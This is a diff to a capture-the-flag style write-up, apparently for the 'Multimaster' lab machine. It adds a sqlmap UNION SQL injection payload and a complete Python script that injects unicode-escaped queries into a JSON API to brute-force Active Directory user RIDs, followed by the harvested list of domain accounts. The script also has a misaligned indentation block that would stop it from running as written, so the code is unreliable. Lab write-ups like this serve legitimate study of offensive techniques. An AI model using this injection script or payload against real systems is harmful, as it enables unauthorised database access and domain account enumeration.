@@ -286,6 +286,12 @@ Parameter: JSON name ((custom) POST)
     Type: time-based blind
     Title: Microsoft SQL Server/Sybase time-based blind (IF)
     Payload: {"name":"\u27' WAITFOR DELAY '0:0:5'-- Wvdt"}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: {"name":"test' UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CH
+AR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR
+(111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm"}
 ---
 [15:57:00] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
 [15:57:00] [INFO] testing Microsoft SQL Server
@@ -412,7 +418,133 @@ SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:pa
 ...
 ```
 
+- There is a way for us to dump domain users
+  - https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html
+  - https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
+  - Below is the script that does that
+  - But before that we have to know:
+    - The name of the domain: `MEGACORP.LOCAL` or `default_domain()`
+    - `SID` of the domain using `select sys.fn_varbintohexstr(SUSER_SID('MEGACORP.LOCAL\Administrator'))`
+    - Then we bruteforce `RID`s to get `AD` users
+  - We will use the payload from the `sqlmap`
+    - `test' UNION ALL SELECT 58,58,58,{},58-- -`
+  - The response will be in the form of `[{"id":58,"name":"58","position":"58","email":"","src":"58"}]`
+    - Where `email` will contain the result of the query
+```
+import sys
+import time
+import struct
+import binascii
+import requests
 
+URL = "http://10.10.10.179/api/getColleagues"
+HEADERS = {"Content-Type": "application/json;charset=utf-8"}
+PAYLOAD = """test' UNION ALL SELECT 58,58,58,{},58-- -"""
+PROXY = {"http": "http://127.0.0.1:8080"}
+
+def unicode_convert(data):
+	payload = ""
+	
+	for char in data:
+		payload += r"\u{:04x}".format(ord(char))
+	return payload
+
+def perform_query(query):
+
+	data = '{"name":"' + unicode_convert(PAYLOAD.format(query)) + '"}'
+	r = requests.post(URL, headers = HEADERS, data = data, proxies = PROXY)
+	
+	return r.json()[0]["email"]
+
+def bruteforce(sid):
+	for i in range(500, 5000):
+		rid = binascii.hexlify(struct.pack("<I", i)).decode()
+		query = f"SUSER_SNAME({sid}{rid})"	
+		user = perform_query(query)
+    if user:
+		  print(f"[+] User: {user}")
+		time.sleep(10)
+	return 0
+
+if __name__ == "__main__":
+	
+	print("[*] Gathering required information for attack")
+	print("[*] Step 1: Domain name")
+	domain = perform_query("DEFAULT_DOMAIN()")
+	print(f"[+] Domain name: {domain}")
+	
+	print("[*] Step 2: Domain SID")
+	sid = perform_query(f"sys.fn_varbintohexstr(SUSER_SID('{domain}\Administrator'))")[:-8]
+	print(f"[+] Domain SID: {sid}")
+
+	print(f"[*] Starting domain user bruteforce for {domain} domain: {sid}")
+	bruteforce(sid)
+	
+	print()
+
+```
+
+- The script will take more
+```
+└─$ python3 mssql-domain-user-bruteforcer.py
+[*] Gathering required information for attack
+[*] Step 1: Domain name
+[+] Domain name: MEGACORP
+[*] Step 2: Domain SID
+[+] Domain SID: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
+[*] Starting domain user bruteforce for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
+[+] User: MEGACORP\Administrator                              
+[+] User: MEGACORP\Guest                              
+[+] User: MEGACORP\krbtgt                              
+[+] User: MEGACORP\DefaultAccount                              
+[+] User: MEGACORP\Domain Admins                              
+[+] User: MEGACORP\Domain Users                              
+[+] User: MEGACORP\Domain Guests                              
+[+] User: MEGACORP\Domain Computers                              
+[+] User: MEGACORP\Domain Controllers                              
+[+] User: MEGACORP\Cert Publishers                              
+[+] User: MEGACORP\Schema Admins                              
+[+] User: MEGACORP\Enterprise Admins                              
+[+] User: MEGACORP\Group Policy Creator Owners                              
+[+] User: MEGACORP\Read-only Domain Controllers                              
+[+] User: MEGACORP\Cloneable Domain Controllers                              
+[+] User: MEGACORP\Protected Users                              
+[+] User: MEGACORP\Key Admins                              
+[+] User: MEGACORP\Enterprise Key Admins                              
+[+] User: MEGACORP\RAS and IAS Servers                              
+[+] User: MEGACORP\Allowed RODC Password Replication Group                              
+[+] User: MEGACORP\Denied RODC Password Replication Group                              
+[+] User: MEGACORP\MULTIMASTER$                              
+[+] User: MEGACORP\DnsAdmins                              
+[+] User: MEGACORP\DnsUpdateProxy                              
+[+] User: MEGACORP\svc-nas                              
+[+] User: MEGACORP\Privileged IT Accounts                              
+[+] User: MEGACORP\tushikikatomo                              
+[+] User: MEGACORP\andrew                              
+[+] User: MEGACORP\lana                               
+[+] User: MEGACORP\alice                              
+[+] User: MEGACORP\test                               
+[+] User: MEGACORP\dai                                
+[+] User: MEGACORP\svc-sql                              
+[+] User: MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
+[+] User: MEGACORP\sbauer                              
+[+] User: MEGACORP\okent                              
+[+] User: MEGACORP\ckane                              
+[+] User: MEGACORP\kpage                              
+[+] User: MEGACORP\james                              
+[+] User: MEGACORP\cyork                              
+[+] User: MEGACORP\rmartin                              
+[+] User: MEGACORP\zac                                
+[+] User: MEGACORP\jorden                              
+[+] User: MEGACORP\alyx                               
+[+] User: MEGACORP\ilee                               
+[+] User: MEGACORP\nbourne                              
+[+] User: MEGACORP\zpowers                              
+[+] User: MEGACORP\aldom                              
+[+] User: MEGACORP\jsmmons                              
+[+] User: MEGACORP\pmartin                              
+[+] User: MEGACORP\Developers
+```
 ## User
 
 
